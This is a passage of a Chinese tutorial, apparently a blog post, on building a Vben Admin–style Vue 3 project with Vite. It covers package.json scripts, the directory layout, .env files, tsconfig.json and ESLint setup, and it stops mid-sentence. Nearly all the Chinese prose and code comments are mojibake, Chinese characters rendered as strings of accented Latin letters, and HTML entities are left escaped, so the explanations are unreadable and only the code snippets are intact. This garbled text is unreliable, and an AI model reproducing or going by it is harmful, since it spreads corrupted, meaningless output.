ç”¨æ–¼æ‰“åŒ…è¼¸å‡º.gz|.bræ–‡ä»¶\nvite-plugin-svg-icons - å¿«é€Ÿç”Ÿæˆ svg sprite\nç€è¦½å™¨æ”¯æŒ æœ¬åœ°é–‹ç™¼æ¨è–¦ä½¿ç”¨Chrome æœ€æ–°ç‰ˆç€è¦½å™¨ï¼Œä¸æ”¯æŒChrome 80ä»¥ä¸‹ç‰ˆæœ¬ã€‚\nç”Ÿç”¢ç’°å¢ƒæ”¯æŒç¾ä»£ç€è¦½å™¨ï¼Œä¸æ”¯æŒIEã€‚\nå‰µå»ºVbenLearné …ç›® ä½¿ç”¨Viteå‰µå»ºé …ç›® viteå®˜æ–¹æ–‡æª”\n1 2 3 4 5 6 7 8 # å®˜ç¶²ä¸Šçš„å‰µå»ºé …ç›®å‘½ä»¤ yarn create @vitejs/app # åç¨± vben-learn # vue-tsçš„æ¨¡æ¿ âˆš vue-ts yarnå ±éŒ¯ æ–‡ä»¶åã€ç›®éŒ„åæˆ–å·æ¨™èªæ³•ä¸æ­£ç¢ºã€‚å ±éŒ¯ï¼Œåƒè€ƒéˆæ¥\nå®‰è£ vscode æ’ä»¶ å®‰è£æ’ä»¶ VbenAdmin å®˜æ–¹æ¨è\nIconify IntelliSenseï¼šIconify åœ–æ¨™æ’ä»¶ WndiCSS lntelliSenseï¼šwindicss æç¤ºæ’ä»¶ i18n Allyï¼š i18n æ’ä»¶ Veturï¼švue é–‹ç™¼å¿…å‚™ ï¼ˆä¹Ÿå¯ä»¥é¸æ“‡ Volarï¼‰ ESLintï¼šè…³æœ¬ä»£ç¢¼æª¢æŸ¥ Prettier - Code formatterï¼šä»£ç¢¼æ ¼å¼åŒ– Stylelintï¼šcss æ ¼å¼åŒ– DotENVï¼š .env æ–‡ä»¶ é«˜äº® ç²å– Vben Admin å¾ GitHub ç²å–ä»£ç¢¼ 1 git clone https://github.com/vbenjs/vue-vben-admin.git å¾ Gitee ç²å–ä»£ç¢¼ 1 git clone https://gitee.com/annsion/vue-vben-admin.git æ³¨æ„\nGitee çš„ä»£ç¢¼å¯èƒ½ä¸æ˜¯æœ€æ–°çš„\nimagemin ä¾è³´å®‰è£å¤±æ•—è§£æ±ºæ–¹æ³• ç”±æ–¼ imagemin åœ¨åœ‹å…§å®‰è£å›°é›£ï¼Œæä¾›ä»¥ä¸‹å¹¾å€‹è§£æ±ºæ–¹æ¡ˆï¼š\nä½¿ç”¨ yarn åœ¨ package.json å…§é…ç½®(æ¨è–¦ï¼Œé …ç›®å…§å·²é›†æˆï¼Œå‰ææ˜¯å¿…é ˆä½¿ç”¨ yarn) package.json 1 2 3 4 5 // ... \u0026#34;resolutions\u0026#34;: { \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; } // ... ä½¿ç”¨ npmï¼Œåœ¨é›»è…¦ host æ–‡ä»¶åŠ ä¸Šå¦‚ä¸‹é…ç½®å³å¯ etc/hosts 1 199.232.4.133 raw.githubusercontent.com npm script package.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // ... \u0026#34;scripts\u0026#34;: { # å®‰è£ä¾è³´ \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, # é‹è¡Œé …ç›® \u0026#34;serve\u0026#34;: \u0026#34;npm run dev\u0026#34;, # é‹è¡Œé …ç›® \u0026#34;dev\u0026#34;: \u0026#34;vite\u0026#34;, # æ§‹å»ºé …ç›® \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, # æ¸…ç©ºç·©å­˜å¾Œæ§‹å»ºé …ç›® \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, # ç”Ÿæˆæ‰“åŒ…åˆ†æï¼Œåœ¨ `Mac OS` é›»è…¦ä¸ŠåŸ·è¡Œå®Œæˆå¾Œæœƒè‡ªå‹•æ‰“é–‹ç•Œé¢ï¼Œåœ¨ `Window` é›»è…¦ä¸ŠåŸ·è¡Œå®Œæˆå¾Œéœ€è¦æ‰“é–‹ `./build/.cache/stats.html` æŸ¥çœ‹ \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34;, # é¡å‹æª¢æŸ¥ \u0026#34;type:check\u0026#34;: \u0026#34;vue-tsc --noEmit --skipLibCheck\u0026#34;, # é è¦½æ‰“åŒ…å¾Œçš„å…§å®¹ï¼ˆå…ˆæ‰“åŒ…åœ¨é€²è¡Œé è¦½ï¼‰ \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, # ç›´æ¥é è¦½æœ¬åœ° dist æ–‡ä»¶ç›®éŒ„ \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, # ç”Ÿæˆ ChangeLog \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, # åˆªé™¤ç·©å­˜ \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, # åˆªé™¤ node_modules (`window` ç³»çµ±æ‰‹å‹•åˆªé™¤è©²ç›®éŒ„è¼ƒæ…¢ï¼Œå¯ä»¥ä½¿ç”¨è©²å‘½ä»¤ä¾†é€²è¡Œåˆªé™¤) \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, # åŸ·è¡Œ eslint æ ¡é©—ï¼Œä¸¦ä¿®å¾©éƒ¨åˆ†å•é¡Œ \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, # åŸ·è¡Œ prettier æ ¼å¼åŒ–ï¼ˆè©²å‘½ä»¤æœƒå°é …ç›®æ‰€æœ‰ä»£ç¢¼é€²è¡Œ prettier æ ¼å¼åŒ–ï¼Œè«‹è¬¹æ…åŸ·è¡Œï¼‰ \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, # åŸ·è¡Œ stylelint æ ¼å¼åŒ– \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, # å°æ‰“åŒ…çµæœé€²è¡Œ gzip æ¸¬è©¦ \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, # å°æ‰“åŒ…ç›®éŒ„é€²è¡Œ brotli æ¸¬è©¦ \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, # é‡æ–°å®‰è£ä¾è³´ï¼Œè¦‹ä¸‹æ–¹èªªæ˜ \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, # ç”Ÿæˆåœ–æ¨™é›†ï¼Œè¦‹ä¸‹æ–¹èªªæ˜ \u0026#34;gen:icon\u0026#34;: \u0026#34;esno ./build/generate/icon/index.ts\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... ç›®éŒ„èªªæ˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 . â”œâ”€â”€ build # æ‰“åŒ…è…³æœ¬ç›¸é—œ â”‚ â”œâ”€â”€ config # é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ generate # ç”Ÿæˆå™¨ â”‚ â”œâ”€â”€ script # è…³æœ¬ â”‚ â””â”€â”€ vite # viteé…ç½® â”œâ”€â”€ mock # mockæ–‡ä»¶å¤¾ â”œâ”€â”€ public # å…¬å…±éœæ…‹è³‡æºç›®éŒ„ â”œâ”€â”€ src # ä¸»ç›®éŒ„ â”‚ â”œâ”€â”€ api # æ¥å£æ–‡ä»¶ â”‚ â”œâ”€â”€ assets # è³‡æºæ–‡ä»¶ â”‚ â”‚ â”œâ”€â”€ icons # icon sprite åœ–æ¨™æ–‡ä»¶å¤¾ â”‚ â”‚ â”œâ”€â”€ images # é …ç›®å­˜æ”¾åœ–ç‰‡çš„æ–‡ä»¶å¤¾ â”‚ â”‚ â””â”€â”€ svg # é …ç›®å­˜æ”¾svgåœ–ç‰‡çš„æ–‡ä»¶å¤¾ â”‚ â”œâ”€â”€ components # å…¬å…±çµ„ä»¶ â”‚ â”œâ”€â”€ design # æ¨£å¼æ–‡ä»¶ â”‚ â”œâ”€â”€ directives # æŒ‡ä»¤ â”‚ â”œâ”€â”€ enums # æšèˆ‰/å¸¸é‡ â”‚ â”œâ”€â”€ hooks # hook â”‚ â”‚ â”œâ”€â”€ component # çµ„ä»¶ç›¸é—œhook â”‚ â”‚ â”œâ”€â”€ core # åŸºç¤hook â”‚ â”‚ â”œâ”€â”€ event # äº‹ä»¶ç›¸é—œhook â”‚ â”‚ â”œâ”€â”€ setting # é…ç½®ç›¸é—œhook â”‚ â”‚ â””â”€â”€ web # webç›¸é—œhook â”‚ â”œâ”€â”€ layouts # ä½ˆå±€æ–‡ä»¶ â”‚ â”‚ â”œâ”€â”€ default # é»˜èªä½ˆå±€ â”‚ â”‚ â”œâ”€â”€ iframe # iframeä½ˆå±€ â”‚ â”‚ â””â”€â”€ page # é é¢ä½ˆå±€ â”‚ â”œâ”€â”€ locales # å¤šèªè¨€ â”‚ â”œâ”€â”€ logics # é‚è¼¯ â”‚ â”œâ”€â”€ main.ts # ä¸»å…¥å£ â”‚ â”œâ”€â”€ router # è·¯ç”±é…ç½® â”‚ â”œâ”€â”€ settings # é …ç›®é…ç½® â”‚ â”‚ â”œâ”€â”€ componentSetting.ts # çµ„ä»¶é…ç½® â”‚ â”‚ â”œâ”€â”€ designSetting.ts # æ¨£å¼é…ç½® â”‚ â”‚ â”œâ”€â”€ encryptionSetting.ts # åŠ å¯†é…ç½® â”‚ â”‚ â”œâ”€â”€ localeSetting.ts # å¤šèªè¨€é…ç½® â”‚ â”‚ â”œâ”€â”€ projectSetting.ts # é …ç›®é…ç½® â”‚ â”‚ â””â”€â”€ siteSetting.ts # ç«™é»é…ç½® â”‚ â”œâ”€â”€ store # æ•¸æ“šå€‰åº« â”‚ â”œâ”€â”€ utils # å·¥å…·é¡ â”‚ â””â”€â”€ views # é é¢ â”œâ”€â”€ test # æ¸¬è©¦ â”‚ â””â”€â”€ server # æ¸¬è©¦ç”¨åˆ°çš„æœå‹™ â”‚ â”œâ”€â”€ api # æ¸¬è©¦æœå‹™å™¨ â”‚ â”œâ”€â”€ upload # æ¸¬è©¦ä¸Šå‚³æœå‹™å™¨ â”‚ â””â”€â”€ websocket # æ¸¬è©¦wsæœå‹™å™¨ â”œâ”€â”€ types # é¡å‹æ–‡ä»¶ â”œâ”€â”€ vite.config.ts # viteé…ç½®æ–‡ä»¶ â””â”€â”€ windi.config.ts # windcssé…ç½®æ–‡ä»¶ Viteé…ç½®å¤šç’°å¢ƒ èªªæ˜ï¼š å°±å¥½åƒä¹‹å‰åœ¨Vue-Cliä¸­çš„envä¸€æ¨£ã€‚\nViteå®˜ç¶²èªªæ˜\nVbenAdminå®˜æ–¹èªªæ˜\né …ç›®çš„ç’°å¢ƒè®Šé‡é…ç½®ä½æ–¼é …ç›®æ ¹ç›®éŒ„ä¸‹çš„ .envã€.env.developmentã€.env.production\n1 2 3 4 .env # åœ¨æ‰€æœ‰çš„ç’°å¢ƒä¸­è¢«è¼‰å…¥ .env.local # åœ¨æ‰€æœ‰çš„ç’°å¢ƒä¸­è¢«è¼‰å…¥ï¼Œä½†æœƒè¢« git å¿½ç•¥ .env.[mode] # åªåœ¨æŒ‡å®šçš„æ¨¡å¼ä¸­è¢«è¼‰å…¥ .env.[mode].local # åªåœ¨æŒ‡å®šçš„æ¨¡å¼ä¸­è¢«è¼‰å…¥ï¼Œä½†æœƒè¢« git å¿½ç•¥ å‰µå»ºé»˜èªé…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.envæ–‡ä»¶ 1 2 3 4 5 6 7 8 # é‹è¡Œçš„ç«¯å£ VITE_PORT = 3100 # æ‡‰ç”¨åç¨± VITE_GLOB_APP_TITLE = Vben Admin # æ‡‰ç”¨çŸ­åç¨± VITE_GLOB_APP_SHORT_NAME = vue_vben_admin å‰µå»ºç”Ÿç”¢é…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.env.productionæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # æ˜¯å¦ä½¿ç”¨mock VITE_USE_MOCK = true # å…¬å…±è·¯å¾‘ VITE_PUBLIC_PATH = / # æ˜¯å¦åˆªé™¤æ‰€æœ‰æ—¥èªŒæ‰“å° VITE_DROP_CONSOLE = true # æ˜¯å¦å•Ÿç”¨gzipæˆ–brotliå£“ç¸®ã€‚ # å¯é¸ï¼šgzip | brotli | none # å¦‚æœä½ éœ€è¦å¤šå€‹è¡¨æ ¼ï¼Œä½ å¯ä»¥ä½¿ç”¨`,`ä¾†åˆ†éš”ã€‚ VITE_BUILD_COMPRESS = \u0026#39;none\u0026#39; # æ‡‰ç”¨åŸºæœ¬æ¥å£åœ°å€ VITE_GLOB_API_URL=/api # æ–‡ä»¶ä¸Šå‚³åœ°å€ï¼Œå¯é¸ # å¯ä»¥é€šénginxè½‰ç™¼æˆ–ç›´æ¥å¯«å…¥å¯¦éš›åœ°å€ã€‚ VITE_GLOB_UPLOAD_URL=/upload # æ¥å£å‰ç¶´ VITE_GLOB_API_URL_PREFIX= # æ˜¯å¦å•Ÿç”¨åœ–åƒå£“ç¸® VITE_USE_IMAGEMIN= true #ä½¿ç”¨PWA VITE_USE_PWA = false # æ˜¯å¦èˆ‡èˆŠç‰ˆç€è¦½å™¨å…¼å®¹ VITE_LEGACY = false å‰µå»ºé–‹ç™¼é…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.env.developmentæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 VITE_PORT = 3100 # æ˜¯å¦ä½¿ç”¨mock VITE_USE_MOCK = true # å…¬å…±è·¯å¾‘ VITE_PUBLIC_PATH = / # è·¨åŸŸä»£ç†ï¼Œä½ å¯ä»¥é…ç½®å¤šå€‹ä»£ç†ã€‚ VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;http://localhost:3000\u0026#34;],[\u0026#34;/upload\u0026#34;,\u0026#34;http://localhost:3001/upload\u0026#34;]] # VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;https://vvbin.cn/test\u0026#34;]] # æ˜¯å¦åˆªé™¤æ‰€æœ‰æ—¥èªŒæ‰“å° VITE_DROP_CONSOLE = false # æ‡‰ç”¨åŸºæœ¬æ¥å£åœ°å€ VITE_GLOB_API_URL=/api # æ–‡ä»¶ä¸Šå‚³åœ°å€ï¼Œå¯é¸ VITE_GLOB_UPLOAD_URL=/upload # æ¥å£å‰ç¶´ VITE_GLOB_API_URL_PREFIX= æ¸¬è©¦é…ç½® src\\App.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ vitePort }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineComponent, ref } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;App\u0026#34;, setup() { const vitePort = ref(import.meta.env.VITE_PORT); return { vitePort, }; }, }); \u0026lt;/script\u0026gt; ç”Ÿç”¢ç’°å¢ƒå‹•æ…‹é…ç½®ï¼Œå¯åƒè€ƒ Vben Admin å®˜æ–¹èªªæ˜\né…ç½®TS èªªæ˜ æˆ‘å€‘ä½¿ç”¨Viteå‰µå»ºçš„é …ç›®æ™‚ä½¿ç”¨çš„æ˜¯vue-tsæ¨¡æ¿ï¼Œæ‰€ä»¥åœ¨å‰µå»ºé …ç›®çš„æ™‚å€™package.jsonå°±è‡ªå¸¶äº†typescriptã€‚è©²ä¾è³´æœƒç·¨è­¯æˆ‘å€‘çš„tsæ–‡ä»¶ã€‚é‚£éº¼æ˜¯ä¾è³´æˆ‘å€‘å°±å¯ä»¥é…ç½®å®ƒã€‚é…ç½®å…§å®¹é‚„æ˜¯ç…§æ¬Vbençš„ï¼ŒåŠ ä¸Šè¨»é‡‹å’Œè¦å‰‡ä¾†æºã€‚\nå®˜æ–¹æ–‡æª”-tsconfig.jsonæ–‡ä»¶ å®˜æ–¹æ–‡æª”-TSç·¨è­¯é¸é … ä½ ä¸çŸ¥é“çš„ tsconfig.json åƒè€ƒéˆæ¥ å‰µå»ºé…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼štsconfig.jsonæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 { \u0026#34;compilerOptions\u0026#34;: { // â†“ æŒ‡å®šECMAScriptç›®æ¨™ç‰ˆæœ¬ï¼Œesnextç‚ºæœ€æ–°ç‰ˆæœ¬ \u0026#34;target\u0026#34;: \u0026#34;esnext\u0026#34;, // â†“ æŒ‡å®šç”Ÿæˆå“ªå€‹æ¨¡å¡Šç³»çµ±ä»£ç¢¼ï¼Œesnextç‚ºæœ€æ–°ç‰ˆæœ¬ \u0026#34;module\u0026#34;: \u0026#34;esnext\u0026#34;, // â†“ æ±ºå®šå¦‚ä½•è™•ç†æ¨¡å¡Šã€‚ \u0026#34;moduleResolution\u0026#34;: \u0026#34;node\u0026#34;, // â†“ å•Ÿç”¨æ‰€æœ‰åš´æ ¼é¡å‹æª¢æŸ¥é¸é …ã€‚ \u0026#34;strict\u0026#34;: true, // â†“ ç¦æ­¢å°åŒä¸€å€‹æ–‡ä»¶çš„ä¸ä¸€è‡´çš„å¼•ç”¨ã€‚ \u0026#34;forceConsistentCasingInFileNames\u0026#34;: true, // â†“ å…è¨±å¾æ²’æœ‰è¨­ç½®é»˜èªå°å‡ºçš„æ¨¡å¡Šä¸­é»˜èªå°å…¥ã€‚é€™ä¸¦ä¸å½±éŸ¿ä»£ç¢¼çš„è¼¸å‡ºï¼Œåƒ…ç‚ºäº†é¡å‹æª¢æŸ¥ã€‚ \u0026#34;allowSyntheticDefaultImports\u0026#34;: true, // â†“ ç¦ç”¨å‡½æ•¸åƒæ•¸é›™å‘å”è®Šæª¢æŸ¥ã€‚ \u0026#34;strictFunctionTypes\u0026#34;: false, // â†“ åœ¨ .tsxæ–‡ä»¶è£¡æ”¯æŒJSX \u0026#34;jsx\u0026#34;: \u0026#34;preserve\u0026#34;, // â†“ è§£æéç›¸å°æ¨¡å¡Šåçš„åŸºæº–ç›®éŒ„ã€‚æŸ¥çœ‹ æ¨¡å¡Šè§£ææ–‡æª”äº†è§£è©³æƒ…ã€‚ \u0026#34;baseUrl\u0026#34;: \u0026#34;.\u0026#34;, // â†“ å…è¨±ç·¨è­¯javascriptæ–‡ä»¶ã€‚ \u0026#34;allowJs\u0026#34;: true, // â†“ ç”Ÿæˆç›¸æ‡‰çš„ .mapæ–‡ä»¶ã€‚ \u0026#34;sourceMap\u0026#34;: true, \u0026#34;esModuleInterop\u0026#34;: true, \u0026#34;resolveJsonModule\u0026#34;: true, // â†“ è‹¥æœ‰æœªä½¿ç”¨çš„å±€éƒ¨è®Šé‡å‰‡æ‹‹éŒ¯ã€‚ \u0026#34;noUnusedLocals\u0026#34;: true, // â†“ è‹¥æœ‰æœªä½¿ç”¨çš„åƒæ•¸å‰‡æ‹‹éŒ¯ã€‚ \u0026#34;noUnusedParameters\u0026#34;: true, // â†“ å•Ÿç”¨å¯¦é©—æ€§çš„ESè£é£¾å™¨ã€‚ \u0026#34;experimentalDecorators\u0026#34;: true, // â†“ ç·¨è­¯éç¨‹ä¸­éœ€è¦å¼•å…¥çš„åº«æ–‡ä»¶çš„åˆ—è¡¨ã€‚ \u0026#34;lib\u0026#34;: [\u0026#34;dom\u0026#34;, \u0026#34;esnext\u0026#34;], // â†“ è¦åŒ…å«çš„é¡å‹è²æ˜æ–‡ä»¶ååˆ—è¡¨ã€‚ \u0026#34;types\u0026#34;: [\u0026#34;vite/client\u0026#34;], // â†“ è¦åŒ…å«çš„é¡å‹è²æ˜æ–‡ä»¶è·¯å¾‘åˆ—è¡¨ã€‚ \u0026#34;typeRoots\u0026#34;: [\u0026#34;./node_modules/@types/\u0026#34;, \u0026#34;./types\u0026#34;], \u0026#34;incremental\u0026#34;: true, // â†“ åœ¨è¡¨é”å¼å’Œè²æ˜ä¸Šæœ‰éš±å«çš„ anyé¡å‹æ™‚å ±éŒ¯ã€‚ \u0026#34;noImplicitAny\u0026#34;: false, // â†“ å¿½ç•¥æ‰€æœ‰çš„è²æ˜æ–‡ä»¶ï¼ˆ *.d.tsï¼‰çš„é¡å‹æª¢æŸ¥ã€‚ \u0026#34;skipLibCheck\u0026#34;: true, // â†“ æ¨¡å¡Šååˆ°åŸºæ–¼ baseUrlçš„è·¯å¾‘æ˜ å°„çš„åˆ—è¡¨ã€‚æŸ¥çœ‹ æ¨¡å¡Šè§£ææ–‡æª”äº†è§£è©³æƒ…ã€‚ \u0026#34;paths\u0026#34;: { \u0026#34;/@/*\u0026#34;: [\u0026#34;src/*\u0026#34;], \u0026#34;/#/*\u0026#34;: [\u0026#34;types/*\u0026#34;] } }, // â†“ æŒ‡å®šä¸€å€‹åŒ¹é…åˆ—è¡¨ï¼ˆå±¬æ–¼è‡ªå‹•æŒ‡å®šè©²è·¯å¾‘ä¸‹çš„æ‰€æœ‰tsç›¸é—œæ–‡ä»¶ï¼‰ \u0026#34;include\u0026#34;: [ \u0026#34;src/**/*.ts\u0026#34;, \u0026#34;src/**/*.d.ts\u0026#34;, \u0026#34;src/**/*.tsx\u0026#34;, \u0026#34;src/**/*.vue\u0026#34;, \u0026#34;types/**/*.d.ts\u0026#34;, \u0026#34;types/**/*.ts\u0026#34;, \u0026#34;mock/**/*.ts\u0026#34; ], // â†“ æŒ‡å®šä¸€å€‹æ’é™¤åˆ—è¡¨ï¼ˆincludeçš„åå‘æ“ä½œï¼‰ \u0026#34;exclude\u0026#34;: [\u0026#34;node_modules\u0026#34;, \u0026#34;dist\u0026#34;, \u0026#34;**/*.js\u0026#34;] } é€™è£¡é…ç½®å®ŒESLintä¹‹å¾Œæœƒå ±éŒ¯ï¼Œèªªæ‰¾ä¸åˆ°vite/clientã€‚ä¸ç”¨ç®¡å®ƒï¼Œç•¶ä½ åŸ·è¡Œå®Œå¾Œé¢çš„ESLint-TSçš„æ™‚å€™å°±ä¸æœƒå ±éŒ¯äº†ã€‚\nå®‰è£ ESLint èªªæ˜ ESLintç°¡å–®çš„ä¾†èªªå°±æ˜¯å»åˆ¤æ–·ä½ çš„JSä»£ç¢¼å¯«çš„æ ¼å¼å°ä¸å°çš„ä¸€å€‹ä¾è³´ã€‚æ²’æœ‰å®ƒä½ çš„ä»£ç¢¼ä¹Ÿèƒ½é‹è¡Œï¼Œæœ‰äº†å®ƒä½ çš„ä»£ç¢¼å¯ä»¥å¯«çš„æ›´æ¼‚äº®ã€‚ ESLinté‚„æ”¯æŒæ’ä»¶ï¼Œç¬¬ä¸‰æ–¹æ¡†æ¶æœƒåŸºæ–¼ESLintå¯«å‡ºè‡ªå·±çš„ä»£ç¢¼æª¢æŸ¥æ’ä»¶ã€‚æ¯”å¦‚Vue3å°æ‡‰eslint-plugin-vueã€‚\nESLintå®˜ç¶² ESLint-å¿«é€Ÿå…¥é–€ é…ç½®ESLint ESLintçš„é…ç½®è¦å‰‡ å®‰è£ ESLint 1 yarn add eslint --dev é…ç½®ESLintï¼šæ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.eslintrc.jsæ–‡ä»¶ã€‚ é€™è£¡å¯ä»¥ä½¿ç”¨eslintçš„initã€‚ä½†æ˜¯æˆ‘ä¸æ¸…æ¥šVbençš„åˆå§‹åŒ–æ“ä½œæ˜¯æ€éº¼é¸çš„ï¼Œæ‰€ä»¥ç›´æ¥æ‹·è²Vbençš„é…ç½®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 module.exports = { // â†“ é»˜èªæƒ…æ³ä¸‹ï¼ŒESLint æœƒåœ¨æ‰€æœ‰çˆ¶ç´šç›®éŒ„è£¡å°‹æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¸€ç›´åˆ°æ ¹ç›®éŒ„ã€‚å¦‚æœä½ æƒ³è¦ä½ æ‰€æœ‰é …ç›®éƒ½éµå¾ªä¸€å€‹ç‰¹å®šçš„ç´„å®šæ™‚ï¼Œé€™å°‡æœƒå¾ˆæœ‰ç”¨ï¼Œä½†æœ‰æ™‚å€™æœƒå°è‡´æ„æƒ³ä¸åˆ°çš„çµæœã€‚ç‚ºäº†å°‡ ESLint é™è£½åˆ°ä¸€å€‹ç‰¹å®šçš„é …ç›®ï¼Œåœ¨ä½ é …ç›®æ ¹ç›®éŒ„ä¸‹çš„ package.json æ–‡ä»¶æˆ–è€… .eslintrc.* æ–‡ä»¶è£¡çš„ eslintConfig å­—æ®µä¸‹è¨­ç½® \u0026#34;root\u0026#34;: trueã€‚ ESLint ä¸€æ—¦ç™¼ç¾é…ç½®æ–‡ä»¶ä¸­æœ‰ \u0026#34;root\u0026#34;: trueï¼Œå®ƒå°±æœƒåœæ­¢åœ¨çˆ¶ç´šç›®éŒ„ä¸­å°‹æ‰¾ã€‚ // â†“ æ­¤é …æ˜¯ç”¨ä¾†å‘Šè¨´eslintæ‰¾ç•¶å‰é…ç½®æ–‡ä»¶ä¸èƒ½å¾€çˆ¶ç´šæŸ¥æ‰¾ root: true, // â†“ æŒ‡å®šä½ æƒ³å•Ÿç”¨çš„ç’°å¢ƒ env: { browser: true, node: true, es6: true, }, // â†“ è¨­ç½®è§£æå™¨ parser: \u0026#34;\u0026#34;, // â†“ è§£æå™¨é¸é … parserOptions: {}, // â†“ æ“´å±•é … extends: [], // â†“ è‡ªå®šç¾©è¦å‰‡é…ç½® rules: {} } é…ç½®ESLintå¿½ç•¥æ–‡ä»¶ï¼šæ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.eslintignoreæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *.sh node_modules *.md *.woff *.ttf .vscode .idea dist /public /docs .husky .local /bin Dockerfile å®‰è£ eslint-plugin-vue èªªæ˜ ESLintæ˜¯æª¢æŸ¥JSä»£ç¢¼çš„ä¾è³´ï¼Œé‚£éº¼å®ƒæ€éº¼å»æª¢æŸ¥Vueèªæ³•çš„æ–‡ä»¶å‘¢ï¼Ÿè¦å®Œæˆé€™ä»¶äº‹ï¼Œæˆ‘å€‘å°±éœ€è¦å®‰è£vueå®˜æ–¹é–‹ç™¼çš„ESLintæ’ä»¶eslint-plugin-vueã€‚é€™æ¨£ESLintå°±çŸ¥é“è©²æ€éº¼æª¢æŸ¥vueçš„æ–‡ä»¶äº†ã€‚\neslint-plugin-vueçš„å®˜æ–¹æ–‡æª” eslint-plugin-vueçš„npmé¦–é  vue eslint å‡ç´š_ESLint çš„ parser æ˜¯å€‹ä»€éº¼æ±è¥¿ vue-eslint-parserçš„Gitåœ°å€ æ€éº¼ç†è§£eslint-plugin-vueå’Œvue-eslint-parserçš„é—œä¿‚å‘¢?\nESLint æœƒå°æˆ‘å€‘çš„ä»£ç¢¼é€²è¡Œæ ¡é©—ï¼Œè€Œ parser çš„ä½œç”¨æ˜¯å°‡æˆ‘å€‘å¯«çš„ä»£ç¢¼è½‰æ›ç‚º ESTreeï¼ŒESLint æœƒå° ESTree é€²è¡Œæ ¡é©—ã€‚\nvue-eslint-parseræ–‡æª”ä¸Šèªªæ˜¯vueçš„æ¨¡æ¿è§£æå™¨ã€‚ vue-eslint-parserçš„æ–‡æª”ä¸­å¼·èª¿\u0026lt;template\u0026gt;æ¨™ç±¤ä¸­çš„å…§å®¹é€²è¡Œæª¢æŸ¥ã€‚\né‚£éº¼æˆ‘çš„ç†è§£æ˜¯vue-eslint-parserå°‡vueæ–‡ä»¶è½‰æ›æˆESTreeã€‚ç„¶å¾Œä½¿ç”¨eslint-plugin-vueä¾†æª¢æŸ¥é€™å€‹ESTreeã€‚æŸ¥å‡ºçš„çµæœäº¤çµ¦ESLintã€‚\nvue-eslint-parserçš„å®˜æ–¹èªªæ˜ï¼š\nThis parser allows us to lint the 